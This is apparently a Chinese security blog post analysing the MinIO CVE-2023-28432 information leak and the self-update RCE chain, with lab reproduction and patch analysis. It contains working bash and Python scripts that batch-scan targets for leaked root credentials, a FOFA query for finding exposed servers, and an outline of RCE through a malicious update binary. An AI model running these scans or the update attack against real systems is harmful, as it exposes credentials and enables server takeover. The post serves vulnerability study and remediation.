---
title: MinIO verify 接口信息泄露-RCE分析(CVE-2023-28432)
date: 2023-4-17 14:46:32
tags: 漏洞分析
category: 渗透测试
---



## 1.漏洞简介

MinIO介绍：

​	MinIO是一个基于Go语言开源的高性能、分布式对象存储服务器，可以在私有云或公有云环境中部署运行，适用于大规模数据存储和处理场景。MinIO可以用于存储和管理大量的非结构化数据，如图片、视频、日志文件等。它还提供了Docker容器化技术集成方案，方便开发人员部署服务。它支持亚马逊云的S3 API（对象存储的接口协议），可以与各种应用程序和工具集成，使得它应用广泛。许多企业和组织都在使用它，例如：华为、谷歌、阿里云、腾讯云、VMware、Splunk、Red Hat等。

​	MinIO的应用场景包括但不限于：

1）云原生应用程序的对象存储：MinIO可以与Kubernetes、Docker等云原生技术集成，为应用程序提供对象存储服务。

2）大数据分析：MinIO可以作为数据湖的一部分，存储和管理大规模的非结构化数据，为数据分析提供支持。

3）备份和归档：MinIO可以作为备份和归档的存储解决方案，为企业提供数据保护和灾难恢复服务。

4）云存储网关：MinIO可以作为云存储网关，将本地存储和云存储集成在一起，为企业提供灵活的存储解决方案。



MinIO运行模式：

​	MinIO提供单节点模式和集群模式运行，单节点模式适用于小规模的数据存储需求，而集群模式适用于大规模的数据存储需求。

​	1）单节点模式是指在一台服务器上运行MinIO，所有的数据都存储在该服务器上。这种模式适用于小规模的数据存储需求，例如个人或小型企业的数据存储。

​	2）集群模式是指在多台服务器上运行MinIO，数据被分散存储在不同的服务器上，通过分布式算法实现数据的高可用和负载均衡。这种模式适用于大规模的数据存储需求，例如大型企业或云服务提供商的数据存储。



漏洞官方通告：https://github.com/minio/minio/security/advisories/GHSA-6xvq-wj2x-3h3q

​	MinIO verify接口存在敏感信息泄漏漏洞，攻击者通过构造特殊URL地址，读取系统敏感信息。

​	MinIO提供了图形化控制台界面来实现自动化数据管理界面，可以简单直观地访问存储套件，即可以直接使用浏览器登录系统管理文件。而在集群模式的配置下**,MinIO 部分接口由于配置不当导致信息泄露**，未经身份认证的远程攻击者通过发送特殊HTTP请求即可获取所有环境变量，其中包括MINIO_SECRET_KEY和MINIO_ROOT_PASSWORD，造成敏感信息泄露，包含内网IP泄露等，最终可能导致攻击者以管理员身份登录MinIO接口,能看到对应权限的存储文件**。甚至进一步借助更新功能实现RCE。**

​	**<u>只有 MinIO 被配置为集群模式时才会受此漏洞影响</u>**，此漏洞的利用无需用户身份认证，官方建议所有使用集群模式配置的用户尽快升级。



影响版本：

```
版本号检测：
1.http请求：GET /api/v1/check-version
2.HTTP响应版本小于RELEASE.2023-03-20T20-16-18Z则存在漏洞
MinIO 2019-12-17T23-16-33Z <= MinIO < 2023-03-20T20-16-18Z
```



## 2.漏洞原理

参考：

> minio搭建及使用：https://www.bmabk.com/index.php/post/2649.html
>
> https://blog.csdn.net/qq_35476650/article/details/129748849

### 2.1 信息泄漏获得账号密码

​	MinIO有单机部署和集群部署，源码routers.go里规定路由规则，当被配置为集群模式时会注册BootstrapREST路由，会受此漏洞影响，如下图：

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042013817.png" alt="集群模式下注册的路由" style="zoom:50%;" />



​	bootstrap-peer-server.go源码定义函数注册路由器，在该路由器上注册了两个REST API处理程序接受HTTP请求，如下图，health请求和verify请求，这些处理程序使用httpTraceHdrs函数包装，以记录HTTP请求的跟踪信息。

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042014690.png" alt="bootstrapREST路由器的两种API" style="zoom:50%;" />



​	bootstrap-peer-server.go源码开头规定了路由访问规则，如下图。bootstrap RESTVersionPrefix：表示REST API版本号的前缀，值为"/v1"，bootstrapRESTPrefix：表示REST API的前缀，值为"/minio/bootstrap"，bootstrapRESTPath：表示完整的REST API路径，值为"/minio/bootstrap/v1"，即最终路由映射：http://xxx:9001/minio/bootstrap/v1/verify。

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042014837.png" alt="bootstrapREST规定的路由地址" style="zoom:50%;" />



​	继续分析VerifyHandler函数，源码如下图，在集群模式的配置下，MinIO界面的路由Verify传递HTTP响应和请求，加载getServerSystemCfg方法，并将其**返回结果编码为JSON格式输出到响应中**。

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042016361.png" alt="VerifyHandler函数源码" style="zoom:50%;" />



​	getServerSystemCfg函数：获取服务器系统配置，包括所有以"MINIO_"开头的环境变量，并去除包含在skipEnvs[envK]键值对中的，最后返回一个包含全局端点和筛选后的环境变量的ServerSystem Config结构体，如下图

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042016577.png" alt="getServerSystemCfg函数源码" style="zoom:50%;" />



​	**<u>而getServerSystemCfg函数未对用户鉴权且skipEnvs键值对过滤不全</u>**，如下图，由于MinIO服务端启动时会把预置的账号、密码等信息加载到环境变量，未设置则默认账号密码为minioadmin/minioadmin。

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042017707.png" alt="配置设定的skipEnvs环境变量" style="zoom:50%;" />



​	那么未经身份认证的远程攻击者通过发送特殊HTTP请求即可获取所有环境变量，其中包括MINIO_ROOT_USER和MINIO_ROOT_PASSWORD，造成敏感信息泄露，包含内网IP泄露等，最终导致攻击者以管理员身份登录MinIO管理，访问对应权限的存储文件。

​	此漏洞的利用无需用户身份认证，利用复杂度低，影响较大，危害性高。

​	影响版本：小于RELEASE.2023-03-20T20-16-18Z。

​	版本号检测：HTTP请求：GET /api/v1/check-version，返回MinIO版本。



省流总结版👇：

> 
>VerifyHandler 函数中调用了 getServerSystemCfg() 函数，该函数返回了 ServerSystemConfig 结构体，其中包含了环境变量 MINIO_ 的键值对。由于环境变量是全局可见的，因此会将账号打印出来 。为什么环境变量中会包含账号密码信息呢？因为根据官方的启动说明，在MinIO在启动时会从环境变量中读取用户预设的管理员账号和密码，如果省略则默认账号密码为minioadmin/minioadmin

### 2.2 寻找RCE利用链

​	由于MinIO采用客户端/服务器（C/S）架构，客户端可以使用MinIO提供的命令行工具mc管理服务器，**而MinIO后台提供自定义更新功能，通过利用这个功能运行恶意二进制文件可以实现RCE。**
​	客户端mc可以实现远程升级MinIO服务器：`mc admin update ALIAS`。由于升级地址可以自定义，可以指定解析为特定MinIO服务器二进制版本的镜像URL：`mc admin update ALIAS https://minio-mirror.example.com/minio` 不指定地址默认从官网更新。

​	而服务器收到更新请求，实际调用/minio/admin/v3/update?updateURL= {updateURL}路由处理请求，远程加载二进制文件，通过ServerUpdateHandler函数对文件下载并重启实现更新：
​	1）验证管理员权限
​	2）从指定地址updateURL下载最新版本（二进制文件）
​	3）下载二进制文件的数字签名文件
​	4）调用verifyBinary函数验证数字签名文件的签名
​	5）验证无误后备份当前MinIO二进制文件并替换为新的二进制文件
​	6）重启MinIO服务器以使更改生效



**由于用于验证签名的verifyBinary函数存在漏洞。**

```
envMinisignPubKey = "MINIO_UPDATE_MINISIGN_PUBKEY"
minisignPubkey := env.Get (envMinisignPubKey, "")
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042023221.png" alt="verifyBinary函数部分源码" style="zoom:50%;" />

​	

​	envMinisignPubKey为环境变量MINIO_UPDATE_MINISIGN_PUBKEY的值，若未设定该值，则envMinisignPubKey为空，minisignPubkey变量作用：对更新包的完整性校验，**为空会略过签名校验，直接更新**，如上图。而官方源码默认该环境变量为空，导致漏洞出现。**<u>！而用Docker搭建环境的话，Dockerfile默认设定了该环境变量的值，这时无法RCE。</u>**

​	那么可以通过构造恶意二进制文件，添加执行系统命令的恶意代码（如反弹shell）来实现RCE，但原本的MinIO服务可能会中断。为了无损利用此漏洞，需要基于MinIO源程序进行修改。

​	思路：添加一个后门路由，实现不破坏正常服务地完成RCE。此漏洞的利用与部署方式无关，只要获得管理员账号密码即可进一步实现恶意升级。

​	

更多参考：

>
> https://cloud.tencent.com/developer/article/2256892?areaSource=&traceId=
>
> https://mp.weixin.qq.com/s/GNhQLuzD8up3VcBRIinmgQ
>
> https://xz.aliyun.com/t/12356
>
> https://y4er.com/posts/minio-cve-2023-28432/
>
> https://exp10it.cn/2023/05/minio-cve-2023-28432-%E8%87%AA%E6%9B%B4%E6%96%B0-rce-%E5%88%86%E6%9E%90/#%E8%87%AA%E6%9B%B4%E6%96%B0-rce
>
> https://www.freebuf.com/vuls/363647.html
>
> 魔改源码：https://github.com/AbelChe/evil_minio
>
> 官方升级说明：https://min.io/docs/minio/linux/reference/minio-mc-admin/mc-admin-update.html#command-mc.admin.update
>



## 3.复现

### 3.1 环境搭建

> https://note.dolyw.com/docker/07-MinIO.html【集群】
>
> https://github.com/vulhub/vulhub/blob/master/minio/CVE-2023-28432/README.zh-cn.md



​	用本地Docker服务开启容器，下载docker-compose.yml：其中包含3个以集群模式运行的Web服务端口，启动命令：`docker-compose up -d`

​	集群启动后，访问http://localhost:9001可以查看MinIO Web控制台界面，如图，而http://localhost:9000是API服务。

```
docker-compose up -d
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304171950082.png" alt=" MinIO登陆界面" style="zoom: 25%;" />



⚠️集群启动后，访问`http://your-ip:9001`可以查看Web管理页面，访问`http://your-ip:9000`是API服务

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304172004759.png" alt="测试环境" style="zoom: 33%;" />

### 3.2 pocs

工具：python3

python3 minio.py -u [http://127.0.0.1:1111](http://127.0.0.1:1111/) 单个url测试

python3 minio.py -f url.txt 批量检测

扫描结束后会在当前目录生成存在漏洞url的vuln.txt

> pocs:
>
> https://github.com/MzzdToT/CVE-2023-28432
>
> https://github.com/Mr-xn/CVE-2023-28432



poc1

```bash
#!/bin/bash
# Author : whgojp
# Enable colors
GREEN='\033[0;32m'
NC='\033[0m'

count=0

while read -r line; do
  ((count++))

  response=$(curl -s -XPOST "$line/minio/bootstrap/v1/verify -k" --connect-timeout 3)	#修改一下 这里加了-k 忽略对 SSL 证书验证
  if echo "$response" | grep -q "MinioEnv"; then		#匹配关键词
    printf "${GREEN}[!] ${line}${NC}：is Vulnerable！！！\n"
    echo "$line" >> result.txt
  else
    printf "[+] (${count}/$(wc -l < MinIO.txt)) Scanning: ${line}\n"
  fi
done < MinIO.txt

```

poc2

```bash
# 需要开集群模式
curl -XPOST x.x.x.x:9000/minio/bootstrap/v1/verify
# 简单批量检测
for i in `cat url.txt`; do echo $i;curl -XPOST $i/minio/bootstrap/v1/verify --connect-timeout 3; done
```

poc3

```python
#code by step 垃圾实现，新建tagets.txt设把MinIO的api端口链接放到tagets.txt中。
#很垃圾的实现就是了

import requests
import json

# 打开保存目标 URL 的文本文件
with open('targets.txt', 'r') as f,open('results.txt', 'w') as f_out:
    # 逐行读取目标 URL 并发送 GET 请求
    for line in f:
        # 删除行末的换行符
        target = line.rstrip('\n')

        # 发送 GET 请求并获取响应
        try: 
            response = requests.post(target+"/minio/bootstrap/v1/verify", data={'key': 'value'},timeout=7)
            # 判断响应中是否包含特定字符串并输出结果
            if 'MINIO_ROOT_PASSWORD' and 'MINIO_ROOT_USER' in response.text:
                print(f"Found 'vulnerable' in {target}")
                f_out.write(f"Found 'vulnerable' in {target}\n")
            else: 
                print("not vulnerable")
        except requests.exceptions.RequestException as e:
            # 如果连接失败，则打印错误信息并继续到下一个目标
            print(f"Connection error")
            continue
```

### 3.3 本地利用

​	用上述的poc批量扫描探测漏洞是否存在：

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304171957787.png" alt="poc批量扫描" style="zoom:50%;" />



​	单个检测利用：

​	命令行直接访问漏洞地址：`curl 'http://localhost:9000/minio/bootstrap/v1/verify' -XPOST`
即可查看敏感信息:

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042039468.png" style="zoom:50%;" />

​	

​	用shell命令jq看得更方便，jq：把文本字符串格式化成json格式的工具。

​	jq安装：

```
macos：
brew install jq

linux通用安装：
wget https://github.com/stedolan/jq/releases/download/jq-1.6/jq-linux64
chmod a+x jq-linux64 && mv jq-linux64 /usr/bin/jq

centos：
yum install epel-release
yum install jq

ubuntu：
apt update
apt install -y jq
```

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304171955480.png" alt="jq格式敏感信息" style="zoom: 25%;" />



关键信息：

```
"MINIO_ROOT_USER": "minioadmin",
"MINIO_ROOT_PASSWORD": "minioadmin-vulhub"
```

拿到账号密码成功登陆后台：

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202304172000866.png" alt="登陆MinIO后台" style="zoom: 25%;" />



### 3.4 资产搜索关键词

fofa：

```
banner="MinIO" || header="MinIO" || title="MinIO Browser"
```



## 4.修复及补丁分析

1.更新版本

MinIO 官方已发布相应的补丁修复漏洞，用户可通过升级到 RELEASE.2023-03-20T20-16-18Z 版本进行漏洞修复。

https://github.com/minio/minio/releases/tag/RELEASE.2023-03-20T20-16-18Z



> 补丁：https://github.com/minio/minio/commit/3b5dbf90468b874e99253d241d16d175c2454077
>
> 分析：https://y4er.com/posts/minio-cve-2023-28432/



2.MinIO 官方已发布相应的补丁修复信息泄露漏洞和RCE漏洞：

​	1）环境变量过滤器增加了敏感字段，输出不会再回显账号密码。

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042048331.png" alt=" skipEnvs增加敏感字段" style="zoom:50%;" />



​	2）bootstrap-peer-server.go源码新增envValues[envK] = logger.HashString (env.Get(envK, ""))，回显的环境变量不再明文处理，而是hash加密。

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042049438.png" alt="补丁对环境变量的处理" style="zoom: 67%;" />



​	3）新增HTTP请求token验证，对用户鉴权，验证不通过返回HTTP 403 Forbidden响应，只有登录用户才能访问

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042049285.png" alt="补丁新增用户鉴权" style="zoom:50%;" />



​	4）针对利用自更新功能实现RCE的漏洞，通过在源码cmd/update.go文件增加二进制文件签名校验，签名公钥不再默认为空，服务器会验证数字签名文件的签名是否与MinIO官方发布的数字签名公钥匹配，以确保数字签名文件的真实性。

<img src="https://pb-1307852621.cos.ap-chengdu.myqcloud.com/typora/202403042051826.png" alt="补丁新增官方签名公钥" style="zoom:50%;" />



## 延伸参考

> 后续rce：https://www.gksec.com/MinIO_RCE.html
>
> https://nvd.nist.gov/vuln/detail/CVE-2021-21287
>
> 赵静静,金慧峰,李霄.基于MinIO存储的综合实践管理平台开发[J].软件,2022,43(10):55-59.
>